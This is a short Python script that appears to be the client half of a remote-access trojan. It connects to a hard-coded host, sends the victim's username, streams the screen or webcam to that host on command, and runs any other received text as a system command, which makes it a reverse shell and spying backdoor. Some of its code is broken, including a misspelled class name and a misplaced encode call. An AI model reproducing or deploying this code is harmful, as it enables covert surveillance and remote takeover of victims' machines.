import socket
from vidstream import *
import getpass
import subprocess as sp

host = '192.168.56.1'
socket_port = 8080

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((host, socket_port))

c.send(str(getpass.getuser())).encode('utf-8')

while True:
	command_data = c.recv(1024).decode('utf-8')

	if command_data == 'screen':
		screen = ScreenSharClient(host, 9999)
		screen.start_stream()
	if command_data == 'webcam':
		camera = CameraClient(host, 9999)
		camera.start_stream()
	else:
		sp.call(str(command_data))